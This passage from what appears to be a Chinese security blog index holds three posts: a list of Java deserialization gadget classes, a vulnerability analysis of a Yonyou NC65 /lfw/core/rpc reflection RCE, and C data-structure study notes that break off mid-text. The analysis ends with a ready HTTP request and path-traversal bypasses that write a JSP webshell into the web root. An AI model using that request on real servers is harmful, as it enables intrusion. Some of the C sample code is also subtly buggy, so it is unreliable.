functors.InvokerTransformerorg.apache.commons.collections4.functors.ChainedTransformerorg.apache.commons.collections4.functors.ConstantTransformerorg.apache.commons.collections4.functors.InstantiateTransformerorg.apache.commons.collections4.map.LazyMaporg.apache.commons.collections4.keyvalue.TiedMapEntryorg.apache.commons.collections4.map.TransformedMaporg.apache.commons.collections4.functors.MapTransformerorg.apache.commons.fileupload.disk.DiskFileItemorg.apache.commons.io.output.DeferredFileOutputStreamorg.apache.commons.io.output.ThresholdingOutputStreamcom.fr.third.org.apache.commons.beanutils.BeanComparatorcom.fr.third.org.apache.commons.collections.Transformercom.fr.third.org.apache.commons.collections.comparators.TransformingComparatorcom.fr.third.org.apache.commons.collections.functors.ChainedTransformercom.fr.third.org.apache.commons.collections.functors.ConstantTransformercom.fr.third.org.apache.commons.collections.functors.InstantiateTransformercom.fr.third.org.apache.commons.collections.map.LazyMapcom.fr.third.org.apache.commons.collections.functors.MapTransformercom.fr.third.org.apache.commons.collections.functors.InvokerTransformercom.fr.third.org.apache.commons.collections.keyvalue.TiedMapEntrycom.fr.third.org.org.apache.commons.collections.map.TransformedMapcom.fr.third.org.apache.commons.collections4.comparators.TransformingComparatorcom.fr.third.org.apache.commons.collections4.functors.InvokerTransformercom.fr.third.org.apache.commons.collections4.functors.ChainedTransformercom.fr.third.org.apache.commons.collections4.functors.ConstantTransformercom.fr.third.org.apache.commons.collections4.functors.InstantiateTransformercom.fr.third.org.apache.commons.collections4.keyvalue.TiedMapEntrycom.fr.third.org.org.apache.commons.collections4.map.TransformedMapcom.fr.third.org.apache.commons.collections4.map.LazyMapcom.fr.third.org.apache.commons.collections4.functors.MapTransformercom.fr.third.org.apache.commons.collections4.Transformercom.fr.third.org.apache.commons.fileupload.disk.DiskFileItemcom.fr.third.org.apache.commons.io.output.DeferredFileOutputStreamcom.fr.third.org.apache.commons.io.output.ThresholdingOutputStreamorg.apache.wicket.util.upload.DiskFileItemorg.apache.wicket.util.io.DeferredFileOutputStreamorg.apache.wicket.util.io.ThresholdingOutputStreamorg.codehaus.groovy.runtime.ConvertedClosureorg.codehaus.groovy.runtime.MethodClosureorg.hibernate.engine.spi.TypedValueorg.hibernate.tuple.component.AbstractComponentTuplizerorg.hibernate.tuple.component.PojoComponentTuplizerorg.hibernate.type.AbstractTypeorg.hibernate.type.ComponentTypeorg.hibernate.type.Typeorg.hibernate.EntityModecom.fr.third.org.hibernate.engine.spi.TypedValuecom.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizercom.fr.third.org.hibernate.tuple.component.PojoComponentTuplizercom.fr.third.org.hibernate.type.AbstractTypecom.fr.third.org.hibernate.type.ComponentTypecom.fr.third.org.hibernate.type.Typecom.fr.third.org.hibernate.EntityModecom.sun.rowset.JdbcRowSetImplorg.jboss.interceptor.builder.InterceptionModelBuilderorg.jboss.interceptor.builder.MethodReferenceorg.jboss.interceptor.proxy.DefaultInvocationContextFactoryorg.jboss.interceptor.proxy.InterceptorMethodHandlerorg.jboss.interceptor.reader.ClassMetadataInterceptorReferenceorg.jboss.interceptor.reader.DefaultMethodMetadataorg.jboss.interceptor.reader.ReflectiveClassMetadataorg.jboss.interceptor.reader.SimpleInterceptorMetadataorg.jboss.interceptor.spi.instance.InterceptorInstantiatororg.jboss.interceptor.spi.metadata.InterceptorReferenceorg.jboss.interceptor.spi.metadata.MethodMetadataorg.jboss.interceptor.spi.model.InterceptionTypeorg.jboss.interceptor.spi.model.InterceptionModelsun.rmi.server.UnicastRefsun.rmi.transport.LiveRefsun.rmi.transport.tcp.TCPEndpointjava.rmi.server.RemoteObjectjava.rmi.server.RemoteRefjava.rmi.server.ObjIDjava.rmi.RemoteObjectInvocationHandlerjava.rmi.server.UnicastRemoteObjectjava.rmi.registry.Registrysun.rmi.server.ActivationGroupImplsun.rmi.server.UnicastServerReforg.springframework.aop.framework.AdvisedSupportnet.sf.json.JSONObjectjavax.xml.transform.Templatesorg.jboss.weld.interceptor.builder.InterceptionModelBuilderorg.jboss.weld.interceptor.builder.MethodReferenceorg.jboss.weld.interceptor.proxy.DefaultInvocationContextFactoryorg.jboss.weld.interceptor.proxy.InterceptorMethodHandlerorg.jboss.weld.interceptor.reader.ClassMetadataInterceptorReferenceorg.jboss.weld.interceptor.reader.DefaultMethodMetadataorg.jboss.weld.interceptor.reader.ReflectiveClassMetadataorg.jboss.weld.interceptor.reader.SimpleInterceptorMetadataorg.jboss.weld.interceptor.spi.instance.InterceptorInstantiatororg.jboss.weld.interceptor.spi.metadata.InterceptorReferenceorg.jboss.weld.interceptor.spi.metadata.MethodMetadataorg.jboss.weld.interceptor.spi.model.InterceptionModelorg.jboss.weld.interceptor.spi.model.InterceptionTypeorg.python.core.PyObjectorg.python.core.PyBytecodeorg.python.core.PyFunctionorg.apache.myfaces.context.servlet.FacesContextImplorg.apache.myfaces.context.servlet.FacesContextImplBaseorg.apache.myfaces.el.CompositeELResolverorg.apache.myfaces.el.unified.FacesELContextorg.apache.myfaces.view.facelets.el.ValueExpressionMethodExpressioncom.sun.syndication.feed.impl.ObjectBeanorg.springframework.beans.factory.ObjectFactoryorg.springframework.core.SerializableTypeWrapper.$MethodInvokeTypeProviderorg.springframework.aop.framework.AdvisedSupportorg.springframework.aop.target.SingletonTargetSourceorg.springframework.aop.framework.JdkDynamicAopProxyorg..springframework.transaction.jta.JtaTransactionManagercom.fr.third.springframework.beans.factory.ObjectFactorycom.fr.third.springframework.core.SerializableTypeWrapper.$MethodInvokeTypeProvidercom.fr.third.springframework.aop.framework.AdvisedSupportcom.fr.third.springframework.aop.target.SingletonTargetSourcecom.fr.third.springframework.aop.framework.JdkDynamicAopProxycom.fr.third.springframework.transaction.jta.JtaTransactionManagercom.vaadin.data.util.NestedMethodPropertycom.vaadin.data.util.PropertysetItemjava.util.PriorityQueuejava.lang.reflect.Proxyjavax.management.MBeanServerInvocationHandlerjavax.management.openmbean.CompositeDataInvocationHandlerjava.beans.EventHandlerjava.util.Comparatororg.reflections.Reflectionscom.fr.third.org.reflections.Reflections\n\n参考文章https://tttang.com/archive/1701/#toc__9\nhttps://xz.aliyun.com/t/12509\nhttps://xz.aliyun.com/t/13389\nhttps://xz.aliyun.com/t/13900\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"用友NC65 lfw反射调用RCE","url":"/2024/03/30/%E7%94%A8%E5%8F%8BNC65%20lfw%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8RCE/","content":"环境nc6.5\n漏洞分析接口/lfw/core/rpc，对应hotwebs/lfw/WEB-INF/web.xml中的LfwDispatcherServlet，nc.uap.lfw.core.servlet.LfwDispatcherServlet在pubwebrt_mvcLevel-1.jar包中。\n\n\n\n\n\n\n\n实例化了LfwCoreController类，并调用了handleRequest方法\n\n\n\n\n\n\n\n调用了PresentPluginFactory.getControlPlugin(path)方法\n\n\n\n\n\n\n\n调用req.getPathInfo()获取到的值为rpc，创建new RpcControlPlugin()对象\n\n\n\n\n\n\n\n在RpcControlPlugin#handle方法中，调用了RpcHelper.processJsonRequest(req, res)方法\n\n\n\n\n\n\n\n从request中获取rpcdata参数，并创建json对象，以json对象作为参数调用call(jsonReq)方法\n\n\n\n\n\n\n\n在call方法中，首先从json中获取rpcname和method参数作为类名和方法名，再循环获取params，添加到paramList中。\n\n\n\n\n\n\n\n获取完成后，会遍历paramList，拿到参数值，调用LfwJsonSerializer.getInstance().fromJsObject(value)方法。\nfor(int i = 0; i &lt; paramCount; ++i) &#123;\tString value = (String)paramList.get(i);\tparamObjs[i] = LfwJsonSerializer.getInstance().fromJsObject(value);\tif (value != null &amp;&amp; value.startsWith(\"$S_\")) &#123;\t\tparamObjs[i] = ((String)paramObjs[i]).substring(\"$S_\".length());\t&#125;\tif (paramObjs[i] != null &amp;&amp; paramObjs[i] instanceof String) &#123;\tparamObjs[i] = JsURLDecoder.decode((String)paramObjs[i], \"UTF-8\");\t&#125;&#125;\n\n调用this.fromJSON(s)方法\n\n\n\n\n\n\n\n调用tok.nextValue()\n\n\n\n\n\n\n\n在nextValue方法中，首先会调用this.nextClean()方法\n\n\n\n\n\n\n\n在this.nextClean()中，解析value中注释区域，并将指向value的指针指向注释区域后。\n\n\n\n\n\n\n\n然后会判断当前所指向的value是否为&quot; 或者 &#39;，如果不是的话会跳过解析，直接调用this.nextString(c);，如果是的话会继续判断是{ ，会将value解析成JSONObject，是[会将value解析成JSONArray对象。\n\n\n\n\n\n\n\n只有是&quot;或者&#39;的情况下会调用this.nextString(c)，参数c就是&quot;或者&#39;，如果value被&quot;或者&#39;包裹起来，那么就会返回被包裹的字符串。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n后续还会判断是否以$S_开头，如果以$S_开头会截取$S_后的内容，接着会对value进行一次url解码。\n\n\n\n\n\n\n\n接着会以className作为参数调用ServiceLocator.getService(className)\n\n\n\n\n\n\n\n调用ServiceLocator.getService(className)这种方式为服务定位器模式，这种设计模式在使用JNDI加载类时，第一次加载后会对类进行缓存，第二次加载会从缓存中去加载，从而提高性能。\n\n\n\n\n\n\n\n指定的className为类路径，那么会在nameIndices中进行查找，最后得到一个实例化对象。\n\n\n\n\n\n\n\n最后并对其进行反射加载。\n\n\n\n\n\n\n\n反射调用利用类nc.uap.portal.service.itf.IPortalSpecService#createSkinFile可实现任意路径下写入任意内容\n\n\n\n\n\n\n\n在进行使用../跨目录写入文件的时候，不会保留/关键字\n\n\n\n\n\n\n\n绕过的方式有三种，一个是使用反斜杠\\，但是在Linux下可能会写入失败；第二种是将路径通过&quot;、或者&#39;包裹起来，这样就不会进入过滤点；第三种是将路径进行两次URL编码，在如上的分析中，可以发现，最后String类型的参数进行了URL解码。\n漏洞复现写入webshell\nPOST /lfw/core/rpc HTTP/1.1Host: 172.20.10.19:8010Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=12B9B1724E7C71EF43C7F27E8F933A24.server; JSESSIONID=F617CD5DDE5690A2BDBFF29049945E2B.serverx-forwarded-for: 9.9.9.9x-originating-ip: 9.9.9.9x-remote-ip: 9.9.9.9x-remote-addr: 9.9.9.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 28446rpcdata=&#123;&quot;rpcname&quot;:&quot;nc.uap.portal.service.itf.IPortalSpecService&quot;,&quot;method&quot;:&quot;createSkinFile&quot;,&quot;params0&quot;:&quot;..&quot;,&quot;params1&quot;:&quot;..&quot;,&quot;params2&quot;:&quot;..\\\\..\\\\..\\\\..\\\\home\\\\webapps\\\\nc_web&quot;,&quot;params3&quot;:&quot;..&quot;,&quot;params4&quot;:&quot;hello.jsp&quot;,&quot;params5&quot;:&quot;liang&apos;c&quot;&#125;\n\n\n\n\n\n\n\n\n访问 http://172.20.10.19:8010/hello.jsp rebeyond\n\n\n\n\n\n\n\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"数据结构学习笔记1","url":"/2022/03/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/","content":"\n根据郝斌老师的视频所做的一份笔记。\n视频地址：https://www.bilibili.com/video/BV11s41167h6\n老师讲得清晰易懂，非常推荐用来入门数据结构。\n\n预备知识指针\n\n指针的重要性\n指针是C语言的灵魂\n\n\n定义\n地址\n地址就是内存单元的编号\n从0开始的非负整数\n范围：0 - FFFFFFFF\n\n\n\n\n指针\n指针就是地址 地址就是指针\n指针变量是存放内存单元地址的变量\n指针的本质是一个操作受限的非负整数\n\n\n\n\n分类\n基本类型的指针\n指针和数组的关系\n\n\n\n\n结构体\n\n为什么会出现结构体？\n\n为了表示一些复杂的数据，而普通的基本类型变量无法满足要求。\n\n\n什么叫结构体\n\n结构体是用户根据实际需要自己定义的复合数据类型\n\n\n如何使用结构体\n\n两种方式\nstruct Student st = &#123;1000, &quot;lisi&quot;, 20&#125;;struct Student * pst = &amp;st;\n\n\n\n通过结构体变量名来实现\n\nst.sid\n\n\n通过指向结构体变量的指针来实现【重点】\n\npst-&gt;sid\npst所指向的结构体变量中的sid这个成员\n\n\n\n\n\n\n\n  注意事项\n\n结构体变量不能加减乘除，但可以相互赋值\n普通结构体变量和结构体指针变量作为函数传参的问题\n\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;struct Student&#123;\tint sid;\tchar name[200];\tint age;\t&#125;;int main(void)&#123;\tstruct Student st = &#123;100, \"zhangsan\", 23&#125;;\tprintf(\"%d %s %d\\n\", st.sid, st.name, st.age);\t\t\tst.sid = 200;\t// st.name = \"lisi\";\tstrcpy(st.name, \"lisi\");\tst.age = 25;\t\tprintf(\"%d %s %d\\n\", st.sid, st.name, st.age);\treturn 0;&#125;\n\n动态内存的分配和释放\n# include &lt;stdio.h&gt;# include &lt;malloc.h&gt;int main(void)&#123;\t// 静态定义数组\tint arr[5] = &#123;1,2,3,4,5&#125;;\t\tprintf(\"%d\\n\", arr[0]); \t\t// 动态定义数组\tint len;\tprintf(\"请输入数组大小：\\n\"); \tscanf(\"%d\", &amp;len);\tint *pArr = (int *)malloc(sizeof(int)*len);\t*pArr = 10;\tpArr[1] = 20;\tprintf(\"%d\\n\", pArr[0]);\tprintf(\"%d\\n\", pArr[1]); \tprintf(\"数组长度：%d\\n\",len); \t// 输入 \tfor(int i=0; i&lt;len; i++)&#123;\t\tscanf(\"%d\", &amp;pArr[i]);\t&#125;\t// 输出 \tfor(int i=0; i&lt;len; i++)&#123;\t\tprintf(\"%d\\n\", pArr[i]);\t&#125;\t// 释放内存 \tfree(pArr);\t\t\treturn 0;&#125;\n\n模块一线性结构[把所有的结点用一根直线穿起来]\n连续存储 数组\n什么叫数组\n\n元素类型相同，大小相等\n\n\n数组优缺点\n优点：\n\n存取速度快\n\n缺点：\n\n事先必须知道数组的长度    \n插入删除元素很慢\n空间通常是有限制的\n需要大块连续的内存块\n\n\n\n数组的算法\n# include &lt;stdio.h&gt;# include &lt;malloc.h&gt; # include &lt;stdlib.h&gt;struct Arr&#123;\tint *pBase; // 存储数组第一个元素的地址 \tint len; // 存储数组长度 \tint cnt; // 存储当前数组有效的元素个数 &#125;;void init_arr(struct Arr *pArr, int length); // 初始化数组 bool append_arr(struct Arr *pArr, int val); // 追加 bool insert_arr(struct Arr *pArr, int pos, int val); // 插入  pos从1开始 bool delete_arr(); // 删除 int get();  // 获取 bool is_empty(struct Arr *pArr); // 是否为空 bool is_full(struct Arr *pArr); // 是否已满 void sort_arr(); // 排序 void show_arr(struct Arr *arr); // 查看数组 void inversion_arr(); // 逆序 int main(void)&#123;\tstruct Arr arr;\tinit_arr(&amp;arr, 6);\t\tshow_arr(&amp;arr);\tfor(int i=0; i&lt;5;i++)&#123;\t\tappend_arr(&amp;arr, i);\t&#125; \tshow_arr(&amp;arr);\tinsert_arr(&amp;arr, 2, 99);\tshow_arr(&amp;arr);\tprintf(\"%d\\n\", arr.len);\treturn 0;&#125;// 初始化 void init_arr(struct Arr *pArr, int length)&#123;\tpArr-&gt;pBase = (int *)malloc(sizeof(int) * length);\tif(NULL == pArr-&gt;pBase)&#123;\t\tprintf(\"动态内存分配失败！\\n\");\t\texit(-1);\t&#125;else&#123;\t\tpArr-&gt;len = length;\t\tpArr-&gt;cnt = 0;\t&#125;\treturn;&#125;// 判断数组是否为空bool is_empty(struct Arr * pArr)&#123;\tif(pArr-&gt;cnt == 0)\t\treturn true;\telse\t\treturn false;\t&#125;// 查看数组 void show_arr(struct Arr *pArr)&#123;\tif(is_empty(pArr))&#123;\t\tprintf(\"数组为空！\\n\"); \t&#125;else&#123;\t\tfor(int i=0; i&lt;pArr-&gt;cnt; i++)&#123;\t\t\tprintf(\"%d\\t\", pArr-&gt;pBase[i]);\t\t&#125;\t\tprintf(\"\\n\");\t&#125;&#125;// 是否已满 bool is_full(struct Arr * pArr)&#123;\tif(pArr-&gt;len == pArr-&gt;cnt)\t\treturn true;\telse\t\treturn false;\t&#125;// 追加 bool append_arr(struct Arr * pArr, int val)&#123;\t// 判断是否已满\tif(is_full(pArr))\t\treturn false;\t\tpArr-&gt;pBase[pArr-&gt;cnt] = val;\tpArr-&gt;cnt ++;\treturn true;\t\t &#125;// 插入bool insert_arr(struct\tArr * pArr, int pos, int val)&#123;\tif(is_full(pArr))&#123;\t\treturn false; // 数组满了 \t&#125;\tif(pos&lt;1 || pos&gt;pArr-&gt;len+1)&#123; // 下标错误 或者 下标超过数组长度 错误 \t\treturn false;\t&#125; \t\tfor(int i = pArr-&gt;cnt-1; i&gt;=pos - 1; i--)&#123;\t\tpArr-&gt;pBase[i+1] = pArr-&gt;pBase[i];\t&#125;\tpArr-&gt;pBase[pos-1] = val;\t(pArr-&gt;cnt)++;\treturn true;\t&#125;\n\n离散存储 链表定义\n\nn个节点离散分配\n彼此通过指针相连\n每个节点只有一个前驱节点，每个节点只有一个后续节点\n首节点没有前驱节点，尾节点没有后续节点\n\n链表优缺点\n优点：\n\n空间没有限制\n插入删除元素很快\n\n缺点：\n\n存取数据很慢\n\n专业术语\n\n首节点\n第一个有效节点\n\n\n尾节点\n最后一个有效节点\n\n\n头结点\n头节点的数据类型和首节点类型一样\n第一个有效节点之前的那个节点\n头节点并不存放有效数据\n加头节点的目的主要为了方便对链表的操作\n\n\n头指针\n指向头节点的指针变量\n\n\n尾指针\n指向尾节点的指针变量\n\n\n\n如果希望通过一个函数来对链表进行处理，我们至少要接收链表的哪些参数？\n 只需要一个参数：头指针\n因为我们通过头指针可以推算出链表的其他所有参数\n# include &lt;stdio.h&gt;typedef struct Node&#123;\tint data; //数据域\tstruct Node * pNext;// 指针域\t&#125;NODE, *PNODE; // NODE 等价于 struct Node ; *NODE 等价于 struct Node *  int main(void)&#123;\t\treturn 0;&#125;\n\n分类\n\n单链表\n双链表\n每个节点有两个指针域\n\n\n循环链表\n能通过任何一个节点找到其他节点\n\n\n非循环链表\n\n算法\n\n遍历\n\n查找\n\n清空\n\n销毁\n\n求长度\n\n排序\n\n删除节点\np-&gt;pNext = p-&gt;pNext-&gt;pNext; // 存在内存泄露问题r = p-&gt;pNext;p-&gt;pNext = p-&gt;pNext-&gt;pNext;free(r);\n\n插入节点 \nq-&gt;pNext = p-&gt;pNext;p-&gt;pNext = q;\n\n创建单链表\n# include &lt;stdio.h&gt;# include &lt;malloc.h&gt; typedef struct Node&#123;\tint data;// 数据域\tstruct Node * pNext; // 指针域 &#125;NODE, *PNODE;PNODE create_list(void);void traverse_list(PNODE pHead);int main(void)&#123;\t// 存放链表头结点 \tPNODE pHead; \t// 创建链表 \tpHead = create_list(); \t// 遍历链表 \ttraverse_list(pHead); \t\treturn 0;&#125;PNODE create_list(void)&#123;\tPNODE pHead = (PNODE)malloc(sizeof(PNODE));\tint len; // 节点个数  \tint val;\tif(pHead == NULL)&#123;\t\tprintf(\"动态创建内存失败！\");\t\texit(-1);\t&#125;\tPNODE pTail = pHead; \tpTail-&gt;pNext = NULL;\tprintf(\"请输入生成链表节点个数：\\n\");\tscanf(\"%d\", &amp;len); \tfor(int i=0; i&lt;len; ++i)&#123;\t\tprintf(\"请输入第%d个节点的值：\\n\", i+1);\t\tscanf(\"%d\", &amp;val);\t\t// 创建节点\t\tPNODE pNode = (PNODE)malloc(sizeof(PNODE));\t \tif(pNode==NULL)&#123;\t \t\tprintf(\"动态创建内存失败！\"); \t \t\texit(-1);\t \t&#125;\t \t//  \t \tpNode-&gt;data = val;\t \t//  \t\tpTail-&gt;pNext = pNode;\t\t// 给pNode-&gt;pNext 设置为尾结点 \t\tpNode-&gt;pNext = NULL;\t\t// 改变地址引用 \t\tpTail = pNode; \t\t// 问题：pTail = pNode这里会不会覆盖掉  pTail-&gt;pNext = pNode的赋值？ \t\t// 不会， pTail-&gt;pNext = pNode 是已经赋值完成，这里是将 pNode 地址赋值给 pTail\t\t// 并不会改变pTail-&gt;pNext 的值 \t\t\t\t\t&#125;\treturn pHead;\t&#125; void traverse_list(PNODE pHead)&#123;\tPNODE p = pHead-&gt;pNext;\twhile(p != NULL)&#123;\t\tprintf(\"%d  \", p-&gt;data);\t\tp = p-&gt;pNext;\t&#125;\treturn;&#125;\n\n单链表的算法\n# include &lt;stdio.h&gt;# include &lt;malloc.h&gt;typedef struct Node&#123;\tint val;// 数据域\tstruct Node * pNext; //指针域 &#125;NODE,*PNODE;PNODE create_list();void traverse_list(PNODE pHead);bool is_empty(PNODE pHead);int length_list(PNODE pHead);void sort_list(PNODE pHead);bool insert_list(PNODE pHead, int pos, int val); bool delete_list(PNODE pHead, int pos, int *pVal);  int main(void)&#123;\t\t// 创建链表\tPNODE pHead = create_list(); \t// 遍历链表 \ttraverse_list(pHead);\t// 插入节点 \tinsert_list(pHead, 4, 100);\ttraverse_list(pHead);\t// 删除节点\tint pVal;\tif(delete_list(pHead, 5, &amp;pVal))&#123;\t\tprintf(\"删除成功，删除数据为%d\\n\", pVal); \t&#125; else&#123;\t\tprintf(\"删除失败！\"); \t&#125;\ttraverse_list(pHead);\t// 判断链表是否为空\t/*\tif(is_empty(pHead))&#123;\t\tprintf(\"链表为空！\\n\");\t&#125;else&#123;\t\tprintf(\"链表不为空！\\n\");\t&#125; */\t// 返回链表长度\t/*\tint len = length_list(pHead);\tprintf(\"链表长度为：%d\\n\", len); \t*/\t// 对链表进行排序\t//sort_list(pHead);\t//traverse_list(pHead); \t\treturn 0;&#125; // 创建链表PNODE create_list()&#123;\tPNODE pHead = (PNODE)malloc(sizeof(NODE));\tint len;\tint val;\tif(NULL == pHead)&#123;\t\tprintf(\"内存分配失败！\\n\");\t\texit(-1);\t&#125;\tPNODE pTemp = pHead; \tpTemp-&gt;pNext = NULL;\tprintf(\"请输入创建链表节点数：\\n\");\tscanf(\"%d\", &amp;len);\tfor(int i=0; i&lt;len; i++)&#123;\t\tprintf(\"请输入第%d个节点的值：\\n\", i+1);\t\tscanf(\"%d\", &amp;val);\t\t// 创建节点\t\tPNODE pNew =  (PNODE)malloc(sizeof(NODE));\t\tpNew-&gt;val = val;\t\tpTemp-&gt;pNext = pNew;\t\tpNew-&gt;pNext = NULL;\t\tpTemp = pNew; \t\t&#125;\treturn pHead;\t&#125;// 遍历列表 void traverse_list(PNODE pHead)&#123;\tPNODE p = pHead-&gt;pNext;\twhile(NULL != p)&#123;\t\tprintf(\"%d \", p-&gt;val);\t\tp = p-&gt;pNext;\t&#125;\tprintf(\"\\n\");\treturn;&#125;// 判断链表是否为空 bool is_empty(PNODE pHead)&#123;\tif(NULL == pHead-&gt;pNext)\t\treturn true;\telse\t\treturn false; &#125;// 返回链表长度 int length_list(PNODE pHead)&#123;\tPNODE p = pHead-&gt;pNext;\tint len = 0; \twhile(NULL != p)&#123;\t\tlen ++;\t\tp = p-&gt;pNext;\t&#125;\t\treturn len;&#125;// 链表排序 void sort_list(PNODE pHead)&#123;\t/* \t\tfor(i=0;i&lt;4;i++)&#123;\t\tfor(j=i+1;j&lt;4-i;j++)&#123;\t\t\tif(arr[i]&gt;arr[j])&#123;\t\t\tt = arr[i];\t\t\tarr[i] = arr[j];\t\t\tarr[j] = t;\t\t&#125;\t&#125;*/\tPNODE q,p;\tint i,j,t;\tint len = length_list(pHead);\tfor(i=0,p=pHead-&gt;pNext; i&lt;len; i++, p=p-&gt;pNext)&#123;\t\tfor(j=i+1;j&lt;len;j++)&#123;\t\t\tif(p-&gt;val &gt; p-&gt;pNext-&gt;val)&#123; \t// arr[i]&gt;arr[j] \t\t\t\tt = p-&gt;val;  \t\t\t\t// t = arr[i] \t\t\t\tp-&gt;val = p-&gt;pNext-&gt;val; \t\t// arr[i] = arr[j] \t\t\t\tp-&gt;pNext-&gt;val = t; \t\t\t// arr[j] = t\t\t\t&#125;\t\t&#125;\t\t&#125;&#125;// 链表节点插入bool insert_list(PNODE pHead, int pos, int val)&#123;\tint i = 0;\tPNODE p = pHead;\twhile(NULL!=p&amp;&amp;i&lt;pos-1)&#123;\t\tp = p-&gt;pNext;\t\t++i;\t&#125;\tif(i&gt;pos-1||NULL==p)\t\treturn false;\t\t\t \t// 实现插入节点\t\tPNODE pNew = (PNODE)malloc(sizeof(NODE));\tif(NULL==pNew)&#123;\t\tprintf(\"动态分配内存失败！\\n\");\t\texit(-1);\t&#125; \tpNew-&gt;val = val;\tPNODE q = p-&gt;pNext; // 将下一个节点得指针 赋值给临时指针q \tp-&gt;pNext = pNew; // 将下一节点的指针指向新生成的节点 \tpNew-&gt;pNext = q; // 再将新生成的节点的指针域指向临时指针q \treturn true;\t&#125; // 节点删除bool delete_list(PNODE pHead, int pos, int * pVal)&#123;\tPNODE p = pHead;\tint i = 0;\twhile(NULL!=p-&gt;pNext&amp;&amp;i&lt;pos-1)&#123;\t\tp = p-&gt;pNext;\t\ti++;\t&#125;\t\tif(i&gt;pos-1||NULL==p-&gt;pNext)&#123;\t\treturn false;\t&#125;\t// 实现删除节点 \tPNODE q = p-&gt;pNext; \t*pVal = q-&gt;val;\tp-&gt;pNext = p-&gt;pNext-&gt;pNext;\tfree(q);\treturn true;\t &#125;\n\n\n\n线性结构-&gt;栈定义\n\n一种可以实现”先进后出”的存储结\n\n栈类似于箱子\n\n\n分类\n\n静态栈\n动态栈\n\n算法\n\n出栈\n入栈\n\n应用\n\n函数调用\n中断\n表达式求值\n内存分配\n缓冲处理\n迷宫\n\n栈算法\n# include &lt;stdio.h&gt;# include &lt;malloc.h&gt;typedef struct Node&#123;\tint data;// 数据域\tstruct Node * pNext; // 指针域\t&#125;NODE,* PNODE; typedef struct Stack&#123;\tPNODE pTop;// 栈顶\tPNODE pBottom;// 栈底 &#125;STACK,* PSTACK;void init_stack(PSTACK pS); // 初始化栈 void push(PSTACK pS, int val); // 入栈 void traverse_stack(PSTACK pS); // 遍历 bool is_empty(PSTACK pS); // 判断栈是否为空bool pop(PSTACK pS, int * val); // 出栈 void clean(PSTACK pS); // 清除栈  int main(void)&#123;\tSTACK S;\tint val;\tinit_stack(&amp;S);\ttraverse_stack(&amp;S);\tpush(&amp;S,1);\tpush(&amp;S,2);\tpush(&amp;S,3); \ttraverse_stack(&amp;S);\tif(pop(&amp;S, &amp;val))&#123;\t\tprintf(\"出栈成功，值为%d\\n\", val);\t\t&#125;else&#123;\t\tprintf(\"出栈失败，栈为空\\n\");\t&#125;\t//clean(&amp;S);\t\ttraverse_stack(&amp;S);\treturn 0;&#125;// 初始化栈 void init_stack(PSTACK pS)&#123;\tpS-&gt;pTop = (PNODE)malloc(sizeof(NODE));\tif(pS-&gt;pTop == NULL)&#123;\t\tprintf(\"动态内存分配失败!\\n\");\t\texit(-1);\t&#125;else&#123;\t\tpS-&gt;pBottom = pS-&gt;pTop;\t\tpS-&gt;pBottom-&gt;pNext = NULL;\t&#125;\t&#125;// 入栈 void push(PSTACK pS, int val)&#123;\tPNODE pNew = (PNODE)malloc(sizeof(NODE));\tpNew-&gt;data = val;\tpNew-&gt;pNext = pS-&gt;pTop;\tpS-&gt;pTop = pNew;\treturn;&#125;bool is_empty(PSTACK pS)&#123;\tif(pS-&gt;pTop == pS-&gt;pBottom)&#123;\t\treturn true;\t&#125;else&#123;\t\treturn false;\t&#125;&#125;// 遍历void traverse_stack(PSTACK pS)&#123;\tif(!is_empty(pS))&#123;\t\t// 非空 \t \tPNODE p = pS-&gt;pTop; \t\twhile(p-&gt;pNext!=NULL)&#123;\t\t\tprintf(\"%d  \", p-&gt;data);\t\t\tp = p-&gt;pNext;\t\t&#125;\t\tprintf(\"\\n\");\t&#125;else&#123;\t\tprintf(\"栈为空！\\n\");\t&#125; &#125; // 出栈bool pop(PSTACK pS, int * val)&#123;\tif(!is_empty(pS))&#123;\t\t// 不为空 \t\tPNODE r = pS-&gt;pTop; \t\t* val = r-&gt;data;\t\tpS-&gt;pTop = r-&gt;pNext;\t\tfree(r);\t\tr = NULL;\t\treturn true;  \t&#125;else&#123;\t\t// 栈为空 \t\treturn false;\t&#125; &#125; // 清除栈void clean(PSTACK pS)&#123;\tif(!is_empty(pS))&#123;\t\tPNODE p = pS-&gt;pTop;\t\tPNODE q = NULL;\t\t// 不为空\t\twhile(p!=pS-&gt;pBottom)&#123;\t\t\tq = p-&gt;pNext;\t\t\tfree(p);\t\t\tp = q;\t\t&#125; \t\tpS-&gt;pTop = pS-&gt;pBottom;\t\t&#125;\treturn;&#125;\n\n线性结构-&gt;队列定义\n\n一种可以实现“先进先出”的存储结构\n\n分类\n\n链式队列 \n用链表实现\n\n\n静态队列\n用数组实现\n静态队列通常必须是循环队列\n\n\n\n\n静态队列为什么必须是循环队列\n\n循环队列需要几个参数来确定\n\nfront\nreal\n\n\n循环队列各个参数的含义\n\n2个参数不同场合有不同的含义\n队列初始化\nfront 和 real 的值都是零\n\n\n队列非空\nfront代表的是队列的第一个元素\nrear代表的是队列的最后一个有效元素的下一个元素\n\n\n队列空\nfont 和 real的值相等，但不一定是零\n\n\n\n\n\n\n循环队列入队伪算法讲解\n\n两步完成\n\n将值存入r所代表的位置\n\n错误的写法 r = r+1\n\n正确的写法 r = (r+1)%数组的长度\n\n\n\n\n\n\n循环队列出队伪算法讲解\n\nfront = 